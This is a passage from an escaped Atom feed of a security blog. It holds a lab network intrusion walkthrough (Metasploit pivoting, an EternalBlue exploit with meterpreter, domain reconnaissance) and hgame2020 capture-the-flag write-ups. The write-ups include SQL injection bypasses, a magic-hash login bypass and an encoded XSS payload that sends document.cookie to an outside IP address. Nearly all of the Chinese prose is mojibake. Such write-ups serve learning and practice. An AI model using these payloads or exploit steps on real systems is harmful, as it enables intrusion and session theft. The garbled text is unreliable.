class=&#34;hljs-keyword&#34;&gt;post&lt;/span&gt;/multi/manage/autoroute&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; session x&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ä»£ç†è½¬å‘&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ä»£ç†è½¬å‘&#34;&gt;#&lt;/a&gt; ä»£ç†è½¬å‘&lt;/h3&gt;
&lt;h4 id=&#34;ä½¿ç”¨ewä»£ç†è½¬å‘&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ä½¿ç”¨ewä»£ç†è½¬å‘&#34;&gt;#&lt;/a&gt; ä½¿ç”¨ ew ä»£ç†è½¬å‘&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;ä¸Šä¼  ew_for_linux64&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œ &lt;code&gt;./ew -s ssocksd -l 8888&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ›´æ”¹ kali çš„ /etc/proxychains4.conf æ–‡ä»¶ï¼Œæ·»åŠ  socks5 ip prot&lt;/li&gt;
&lt;li&gt;åœ¨éœ€è¦ä»£ç†æ—¶ï¼Œæ‰§è¡Œå‘½ä»¤å¦‚ &lt;code&gt;proxychains4 curl http://127.0.0.1:2003/&lt;/code&gt;  å³å¯&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ubuntuä¿¡æ¯æ”¶é›†&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ubuntuä¿¡æ¯æ”¶é›†&#34;&gt;#&lt;/a&gt; Ubuntu ä¿¡æ¯æ”¶é›†&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ä»è·¯ç”±è¡¨å¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªç½‘æ®µï¼Œæœ‰ä¸ª 183 ç½‘æ®µåº”è¯¥å°±æ˜¯å†…ç½‘ç½‘æ®µäº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;msf è¿›è¡Œä¸€æ³¢å­˜æ´»æ‰«æ&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/discovery/udp_probeset rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.0&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;255&lt;/span&gt;set threads &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æœ‰ 128ã€130 ä¸¤å°æœºå­ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‰«ä¸€ä¸‹ ms17-010&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;use&lt;/span&gt; auxiliary/scanner/smb/smb_ms&lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;_&lt;span class=&#34;hljs-number&#34;&gt;010&lt;/span&gt;set rhosts &lt;span class=&#34;hljs-number&#34;&gt;192.168.183.128&lt;/span&gt;-&lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ° 128 çš„ win7 å’Œ 130 çš„ winserver2008 éƒ½å¯èƒ½å­˜åœ¨æ°¸æ’ä¹‹è“ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å°è¯•æ‰“æ°¸æ’ä¹‹è“ï¼Œæµ‹è¯•å‘ç° 128 çš„ win7 èƒ½æ‰“é€šï¼Œ130 çš„ winserver2008 æ‰“ä¸é€šã€‚&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;setg Proxies socks5:&lt;span class=&#34;hljs-number&#34;&gt;10.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;5.100&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;8888&lt;/span&gt;					&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;MSFèµ°ewçš„ä»£ç†set ReverseAllowProxy true							&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;å¼€å¯åå‘ä»£ç†use exploit&lt;span class=&#34;hljs-regexp&#34;&gt;/windows/&lt;/span&gt;smb&lt;span class=&#34;hljs-regexp&#34;&gt;/ms17_010_eternalblueset payload windows/&lt;/span&gt;x64&lt;span class=&#34;hljs-regexp&#34;&gt;/meterpreter/&lt;/span&gt;bind_tcpset rhost &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;183.128&lt;/span&gt;set lport &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;set AutoRunScript post&lt;span class=&#34;hljs-regexp&#34;&gt;/windows/m&lt;/span&gt;anage&lt;span class=&#34;hljs-regexp&#34;&gt;/migrate       /&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/è‡ªåŠ¨è¿ç§»è¿›ç¨‹run&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æˆåŠŸæ‹¿ä¸‹ shell&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7æƒé™ç»´æŒ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7æƒé™ç»´æŒ&#34;&gt;#&lt;/a&gt; Win7 æƒé™ç»´æŒ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;è™½ç„¶æ‹¿åˆ°äº† shellï¼Œä½†æ˜¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°è¿™ä¸ª shell ç»å¸¸æ‰çº¿ï¼Œåªèƒ½æƒ³åŠæ³•å¼„ä¸ªç¨³å®šç‚¹çš„ shell&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;win7ä¿¡æ¯æ”¶é›†&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win7ä¿¡æ¯æ”¶é›†&#34;&gt;#&lt;/a&gt; Win7 ä¿¡æ¯æ”¶é›†&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;route print&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737582.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;code&gt;net user /domain&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;net user&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;code&gt;net view&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;code&gt;ping WIN-ENS2VR5TR3N&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071744532.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
</content>
        <updated>2021-09-20T15:49:36.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2020/02/05/hgame2020/</id>
        <title>hgame2020</title>
        <link rel="alternate" href="http://blog.m1n.me/2020/02/05/hgame2020/"/>
        <content type="html">&lt;p&gt;&lt;a href=&#34;https://hgame.vidar.club/#/challenge/list&#34;&gt;https://hgame.vidar.club/#/challenge/list&lt;/a&gt;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;week1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week1&#34;&gt;#&lt;/a&gt; week1&lt;/h1&gt;
&lt;h2 id=&#34;cosmosçš„åšå®¢&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmosçš„åšå®¢&#34;&gt;#&lt;/a&gt; Cosmos çš„åšå®¢&lt;/h2&gt;
&lt;p&gt;åˆšå¼€å§‹æ‹¿åˆ°é¢˜ç›®æç¤ºè¯´ git æºç æ³„éœ²ï¼Œå°±ç”¨ githack æŠŠæºç æ‰«äº†ä¸‹æ¥ï¼Œä½†æ˜¯çœ‹äº†åŠå¤©æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œåæ¥çœ‹äº† WP æ‰çŸ¥é“ç›´æ¥å» git ä¸Šæ‰¾å†å²æäº¤è®°å½•ï¼Œemmmmm&lt;/p&gt;
&lt;h2 id=&#34;æ¥å¤´éœ¸ç‹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#æ¥å¤´éœ¸ç‹&#34;&gt;#&lt;/a&gt; æ¥å¤´éœ¸ç‹&lt;/h2&gt;
&lt;p&gt;è€ƒå¯ŸçŸ¥è¯†ç‚¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;referer&lt;/li&gt;
&lt;li&gt;X-Forwarded-For&lt;/li&gt;
&lt;li&gt;UA&lt;/li&gt;
&lt;li&gt;è¯·æ±‚æ–¹å¼&lt;/li&gt;
&lt;li&gt;æœ€åä¸€ä¸ªä¹Ÿæ˜¯ä¹‹å‰æ²¡è§è¿‡çš„æ—¶é—´ï¼ŒIf-Unmodified-Sinceï¼Œæ ¼å¼ If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;code-world&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#code-world&#34;&gt;#&lt;/a&gt; Code World&lt;/h2&gt;
&lt;p&gt;è®¿é—®å‘ç° 403ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°æç¤º 302 è·³è½¬ï¼Œå°±ç›´æ¥è®¿é—® index.php å¹¶ä¸”æŠ“åŒ…æ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼ï¼Œç„¶åæç¤ºä»¤ a=10ï¼Œé¢˜ç›®åˆæç¤º a=b+cï¼Œå°±ç”¨ payload?a=1+9, ä½†æ˜¯è¿˜è¦ url ç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶ + ä¼šå˜æˆç©ºæ ¼&lt;/p&gt;
&lt;h2 id=&#34;é¸¡å°¼æ³°ç«&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#é¸¡å°¼æ³°ç«&#34;&gt;#&lt;/a&gt; é¸¡å°¼æ³°ç«&lt;/h2&gt;
&lt;p&gt;æç¤ºåˆ†æ•°è¦ 60000 ä»¥ä¸Šï¼ŒæŠ“åŒ…æ”¹ä¸€ä¸‹å°±å¥½äº†&lt;/p&gt;
&lt;h1 id=&#34;week2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week2&#34;&gt;#&lt;/a&gt; week2&lt;/h1&gt;
&lt;h2 id=&#34;cosmosåšå®¢çš„åå°&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmosåšå®¢çš„åå°&#34;&gt;#&lt;/a&gt; Cosmos åšå®¢çš„åå°&lt;/h2&gt;
&lt;p&gt;è®¿é—®çœ‹åˆ°ç™»é™†ç•Œé¢ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ˜¯ sql æ³¨å…¥ï¼Œå¼„åŠå¤©ä¸è¡Œï¼Œå¿˜è®°äº†æç¤ºåªç”¨äº† HTML å’Œ PHPï¼Œç„¶åç›´æ¥è®¿é—®å‘ç°æœ‰ï¼Ÿaction=login.phpï¼Œåº”è¯¥å¯ä»¥ç”¨ php ä¸ºåè®®è¯»æºç ï¼Œå› æ­¤æ‹¿åˆ°äº† login.php å’Œ admin.php çš„æºç &lt;br&gt;
åœ¨ login.php ä¸­å‘ç° debug å¯ä»¥è¯»å–ä»»æ„å˜é‡ï¼Œè¯»å–ä¸€ä¸‹ username å’Œ password ç„¶å $admin_password åˆæ˜¯å›ºå®šçš„ï¼Œè¯»å–å‘ç°æ˜¯ oe å¼€å¤´çš„ï¼ˆä¿å­˜ä¸€ä¸ª 0e å¼€å¤´çš„ MD5 å€¼å’ŒåŸå€¼ä»¥ä¾¿ä¸æ—¶ä¹‹éœ€ s878926199a/&lt;br&gt;
0e545993274517709034328855841020ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥çªç ´ç™»é™†ï¼Œå°±æ¥åˆ°äº† admin.php é¡µé¢ï¼Œè¯»æºç å‘ç°ç”¨ CSRF å’Œ file ä¼ªåè®®æ‹¿åˆ° flagï¼Œpayloadï¼šfile://localhost/flag&lt;/p&gt;
&lt;h2 id=&#34;cosmosçš„ç•™è¨€æ¿-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmosçš„ç•™è¨€æ¿-1&#34;&gt;#&lt;/a&gt; Cosmos çš„ç•™è¨€æ¿ - 1&lt;/h2&gt;
&lt;p&gt;ç”¨å•å¼•å·é—­åˆå›æ˜¾ä¸ä¸€æ ·ï¼Œå­˜åœ¨ sql&lt;br&gt;
 æ³¨å…¥ç‚¹ï¼Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼è¿˜æœ‰ selectï¼Œç©ºæ ¼å¯ä»¥ç”¨ /**/ ç»•è¿‡ï¼Œselect å¯ä»¥åŒå†™ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œçš„ #è¦ url ç¼–ç æˆ %23ï¼Œä¸ç„¶è¿‡ä¸å» ï¼Œä¸€ç›´å¡åœ¨è¿™é‡Œï¼Œç„¶åå°±æ˜¯ç†Ÿæ‚‰çš„æ‹¿ flag ç¯èŠ‚&lt;/p&gt;
&lt;h2 id=&#34;cosmosçš„æ–°è¯­è¨€&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmosçš„æ–°è¯­è¨€&#34;&gt;#&lt;/a&gt; Cosmos çš„æ–°è¯­è¨€&lt;/h2&gt;
&lt;p&gt;è®¿é—® mycode æ‹¿åˆ°æºç ï¼Œå°±æ˜¯ä¸€å±‚åˆä¸€å±‚çš„åŠ å¯†ï¼Œï¼ŒæŒ‰ç…§åŠ å¯†æ­¥éª¤è§£å¯†å°±å¥½äº†ã€‚ç”±äº token ä¼šå®æ—¶åˆ·æ–°ï¼Œè¿™é‡Œç”¨ py è„šæœ¬è·‘ä¸€ä¸‹å°±å¥½äº†&lt;/p&gt;
&lt;h2 id=&#34;cosmosçš„èŠå¤©å®¤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmosçš„èŠå¤©å®¤&#34;&gt;#&lt;/a&gt; Cosmos çš„èŠå¤©å®¤&lt;/h2&gt;
&lt;p&gt;æç¤ºå¿…é¡»ç®¡ç†å‘˜çš„ token æ‰èƒ½æ‹¿ flagï¼Œç»“åˆé¢˜ç›®çœ‹åº”è¯¥æ˜¯è€ƒå¯Ÿ XSS æ‹¿ cookieã€‚ç„¶åå¼€å§‹æµ‹è¯•è¿‡æ»¤ï¼Œå‘ç°è¿‡æ»¤äº† &amp;lt;ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ HTML å®ä½“ç¼–ç ç»•è¿‡ï¼Œæ„é€  payloadï¼Œï¼ˆè¿™é‡Œæ”¾ä¸€ä¸ªæ‹¿ cookie å¹¶ä¸”ç™»é™†çš„æ€»ç»“æ–‡ç«  https://blog.csdn.net/lhh134/article/details/86477305 ä»¥ä¾¿æ—¥åå¿˜è®°ï¼‰&lt;br&gt;
ç„¶åç”¨ payloadï¼š &lt;code&gt;&amp;lt;svg/onload=&amp;quot;&amp;amp;#x77;&amp;amp;#x69;&amp;amp;#x6e;&amp;amp;#x64;&amp;amp;#x6f;&amp;amp;#x77;&amp;amp;#x2e;&amp;amp;#x6c;&amp;amp;#x6f;&amp;amp;#x63;&amp;amp;#x61;&amp;amp;#x74;&amp;amp;#x69;&amp;amp;#x6f;&amp;amp;#x6e;&amp;amp;#x2e;&amp;amp;#x68;&amp;amp;#x72;&amp;amp;#x65;&amp;amp;#x66;&amp;amp;#x3d;&amp;amp;#x22;&amp;amp;#x68;&amp;amp;#x74;&amp;amp;#x74;&amp;amp;#x70;&amp;amp;#x3a;&amp;amp;#x2f;&amp;amp;#x2f;&amp;amp;#x34;&amp;amp;#x37;&amp;amp;#x2e;&amp;amp;#x39;&amp;amp;#x36;&amp;amp;#x2e;&amp;amp;#x32;&amp;amp;#x33;&amp;amp;#x33;&amp;amp;#x2e;&amp;amp;#x32;&amp;amp;#x31;&amp;amp;#x36;&amp;amp;#x2f;&amp;amp;#x3f;&amp;amp;#x73;&amp;amp;#x3d;&amp;amp;#x22;&amp;amp;#x2b;&amp;amp;#x64;&amp;amp;#x6f;&amp;amp;#x63;&amp;amp;#x75;&amp;amp;#x6d;&amp;amp;#x65;&amp;amp;#x6e;&amp;amp;#x74;&amp;amp;#x2e;&amp;amp;#x63;&amp;amp;#x6f;&amp;amp;#x6f;&amp;amp;#x6b;&amp;amp;#x69;&amp;amp;#x65;&amp;amp;#x3b;&amp;quot;&lt;/code&gt;  æ‹¿åˆ°äº† token&lt;br&gt;
/?token=f802788a02a51f9c624bb5d91815bï¼Œè®¿é—® flag é¡µé¢ï¼Œæ”¹ä¸€ä¸‹ token å°±æ‹¿åˆ°äº† flag&lt;/p&gt;
&lt;h1 id=&#34;week3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#week3&#34;&gt;#&lt;/a&gt; week3&lt;/h1&gt;
&lt;h2 id=&#34;åºåˆ—ä¹‹äº‰-ordinal-scale&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#åºåˆ—ä¹‹äº‰-ordinal-scale&#34;&gt;#&lt;/a&gt; åºåˆ—ä¹‹äº‰ - Ordinal Scale&lt;/h2&gt;
&lt;p&gt;å…ˆæŸ¥çœ‹æºä»£ç å‘ç° source.zipï¼Œæ‹¿åˆ°æºç ï¼Œåˆæ­¥çœ‹ä¸€ä¸‹åº”è¯¥æ˜¯ PHP ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå…ˆçœ‹ä¸€ä¸‹ game.php å‘ç°&lt;/p&gt;
&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$game&lt;/span&gt;-&amp;gt;rank-&amp;gt;Get() === &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&amp;#123;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;xml&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;        &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;hgame&amp;#123;flag_is_here&amp;#125;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &amp;#125;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;äºæ˜¯æ‰¾ä¸€ä¸‹ game ç±»ï¼Œå…¶ä¸­ rank åœ¨__construct æ–¹æ³•ä¸­ï¼Œæ–°å»ºçš„ Rank ç±»ï¼Œè€Œ Rank ç±»ä¸­çš„ rank ç”±__construct æ–¹æ³•åˆ›å»ºï¼Œæ¥è‡ª session æˆ–è€…ç›´æ¥éšæœºï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è®© rank=1ï¼Œä½†æ˜¯å‘ç°æœ‰__destruct æ–¹æ³•æ¥åˆ¤æ–­ Rank ç±»æ˜¯ä¸æ˜¯æœåŠ¡å™¨å®šä¹‰çš„ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥åˆ©ç”¨ construct å‡½æ•°å®šä¹‰this-&gt;key = &amp;this-&amp;gt;severKey æ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾ååºåˆ—åŒ–çš„ç‚¹ï¼Œå‘ç°åœ¨ Monster ç±»ä¸­å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œä½†æ˜¯æ˜¯é€šè¿‡ cookie çš„æ–¹å¼ä¼ å…¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ ç¬¦åˆçš„ cookie æ¥å°† payload ä¼ å…¥ï¼Œè¿™é‡Œå°±éœ€è¦çŸ¥é“ encryptKey æ˜¯å¤šå°‘ï¼Œè€Œ encryptKey æ˜¯ç”±å‚æ•°ä¼ å…¥çš„ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = [&lt;span class=&#34;hljs-variable&#34;&gt;$playerName&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;encryptKey];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;init&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;foreach&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;)&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;welcomeMsg = sprintf(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;welcomeMsg, &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;sign .= md5(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;sign . &lt;span class=&#34;hljs-variable&#34;&gt;$value&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å…¶ä¸­ foreach ç”¨æ³•ï¼š&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png&#34; alt=&#34;1&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 ä»¥åŠ sprintf ç”¨æ³•ï¼š&lt;br&gt;
